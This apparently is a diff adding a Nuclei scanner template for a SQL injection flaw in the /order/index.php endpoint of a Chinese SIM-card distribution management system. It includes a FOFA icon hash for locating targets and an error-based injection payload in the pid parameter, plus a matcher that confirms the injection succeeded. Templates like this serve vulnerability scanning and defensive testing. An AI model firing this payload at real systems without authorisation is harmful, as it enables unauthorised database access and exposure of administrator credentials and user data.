@@ -1,0 +1,38 @@
+id: haoka-index_php-sql
+
+info:
+  name: "号卡极团分销管理系统order 接口SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="-795291075"
+      号卡极团分销管理系统/order/index.php接口存在SQL注入漏洞。攻击者可通过该漏洞执行恶意SQL语句，导致数据库敏感信息泄露，如管理员凭证及用户数据。在具备高权限条件下，可能实现服务器端恶意代码写入，进而控制服务器系统权限。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488439&idx=1&sn=dc594d32088d00f69d51b137d775322a&chksm=c267a684f5102f92a5d2948358f9bed59a8b6bf14598b7e22a37f1cfc3302b9c3c9adeeb302a&token=2115358587&lang=zh_CN#rd
+  tags: 号卡极团分销管理系统
+
+
+
+http:
+- raw:
+  - |
+    GET /order/index.php?pid=1%27%20AND%20(extractvalue(1,concat(0x7e,(select%20md5(123456)),0x7e)));--%20htjf HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '~e10adc3949ba59abbe56e057f20f883'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
+
+
